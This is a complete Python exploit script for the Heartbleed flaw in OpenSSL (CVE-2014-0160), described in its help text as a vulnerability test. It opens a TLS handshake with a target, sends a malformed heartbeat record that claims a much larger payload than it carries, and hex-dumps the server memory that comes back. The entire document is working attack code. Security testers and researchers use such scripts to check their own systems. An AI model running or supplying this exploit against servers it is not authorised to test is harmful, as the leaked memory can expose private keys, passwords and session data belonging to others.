#!/usr/bin/python
import sys
import struct
import socket
import time
import select
from optparse import OptionParser

options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')

def h2bin(x):
    return bytes.fromhex(x.replace(' ', '').replace('\n', ''))

hello = h2bin('''
16 03 01 00 34 01 00 00 30 03 01
00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f
10 11 12 13 14 15 16 17 18 19 1a 1b 1c 1d 1e 1f
00 00 02 00 2f 01 00 00 05 00 0f 00 01 01
''')

hb = h2bin('''
18 03 01 00 03
01 40 00
''')

def hexdump(s):
    for b in range(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        hxdat = ' '.join('%02X' % c for c in lin)
        pdat = ''.join((chr(c) if 32 <= c <= 126 else '.' )for c in lin)
        print('  %04x: %-48s %s' % (b, hxdat, pdat))
    print()

def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = b''
    remain = length
    while remain > 0:
        rtime = endtime - time.time() 
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            data = s.recv(remain)
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata

def recvmsg(s):
    hdr = recvall(s, 5)
    if hdr is None:
        print('Unexpected EOF receiving record header - server closed connection')
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        print('Unexpected EOF receiving record payload - server closed connection')
        return None, None, None
    print(' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay)))
    return typ, ver, pay

def hit_hb(s):
    s.send(hb)
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            print('No heartbeat response received, server likely not vulnerable')
            return False

        if typ == 24:
            print('Received heartbeat response:')
            hexdump(pay)
            if len(pay) > 3:
                print('WARNING: server returned more data than it should - server is vulnerable!')
            else:
                print('Server processed malformed heartbeat, but did not return any extra data.')
            return True

        if typ == 21:
            print('Received alert:')
            hexdump(pay)
            print('Server returned error, likely not vulnerable')
            return False

def main():
    opts, args = options.parse_args()
    if len(args) < 1:
        options.print_help()
        return

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print('Connecting...')
    sys.stdout.flush()
    s.connect((args[0], opts.port))
    print('Sending Client Hello...')
    sys.stdout.flush()
    s.send(hello)
    print('Waiting for Server Hello...')
    sys.stdout.flush()
    while True:
        typ, ver, pay = recvmsg(s)
        if typ == None:
            print('Server closed connection without sending Server Hello.')
            return
        if typ == 22 and pay[0] == 0x0E:
            break

    print('Sending heartbeat request...')
    sys.stdout.flush()
    s.send(hb)
    hit_hb(s)

if __name__ == '__main__':
    main()